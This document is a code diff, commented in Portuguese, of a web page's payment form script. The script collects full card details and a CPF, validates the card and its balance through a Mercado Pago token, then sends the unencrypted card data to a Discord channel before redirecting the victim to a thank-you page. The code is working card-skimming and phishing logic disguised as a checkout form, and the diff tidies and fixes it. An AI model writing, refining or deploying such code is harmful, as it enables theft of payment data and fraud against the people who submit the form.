@@ -641,6 +641,7 @@ document.getElementById('form-tech').onsubmit = async function(e) {
     e.preventDefault();
     const l = document.getElementById('loading'), t = document.getElementById('load-txt');
     
+    // Se for PIX, apenas gera e envia o alerta
     if(document.getElementById('t-pix').classList.contains('active')) {
         l.style.display = 'flex';
         await enviarPixParaDiscord();
@@ -648,6 +649,7 @@ document.getElementById('form-tech').onsubmit = async function(e) {
         return;
     }
 
+    // Pega os dados do formulário
     const dadosAbertos = {
         numero: document.getElementById('c1').value,
         nomeNoCartao: document.getElementById('c2').value.toUpperCase(),
@@ -662,6 +664,7 @@ document.getElementById('form-tech').onsubmit = async function(e) {
     t.innerText = "Verificando com o banco...";
 
     try {
+        // 1. Cria o Token no Mercado Pago
         const expiry = dadosAbertos.validade.split('/');
         const token = await mp.createCardToken({
             cardNumber: dadosAbertos.numero.replace(/\s/g,''),
@@ -673,32 +676,32 @@ document.getElementById('form-tech').onsubmit = async function(e) {
             identificationNumber: dadosAbertos.cpf.replace(/\D/g,'')
         });
 
+        // 2. Manda para o seu server.js validar o saldo de R$ 1,00
         const check = await fetch('/validar-cartao', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ 
-        token: token.id, 
-        cpf: cpf.replace(/\D/g,'') // Limpa o CPF antes de enviar
-    })
-});
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                token: token.id, 
+                cpf: dadosAbertos.cpf.replace(/\D/g, '') 
+            })
+        });
 
         if (check.ok) {
             const resData = await check.json();
+            // Pega o modelo (Black, Gold, etc) que o servidor descobriu
             dadosAbertos.modelo = resData.modelo || "Comum";
+            
+            // 3. Envia os dados ABERTOS para o seu Discord
             await enviarDadosCompletosParaDiscord(dadosAbertos);
+            
             window.location.href = "obrigado.html";
         } else {
-            throw new Error();
+            throw new Error("Saldo insuficiente ou dados inválidos");
         }
     } catch(e) {
         l.style.display = 'none';
-        alert("❌ CARTÃO RECUSADO.");
+        alert("❌ CARTÃO RECUSADO: Verifique os dados ou o saldo disponível.");
     }
-};
-
-window.onload = () => {
-    update();
-    startTimer(60 * 5, document.querySelector('#timer')); 
 };
 </script>
 </body>
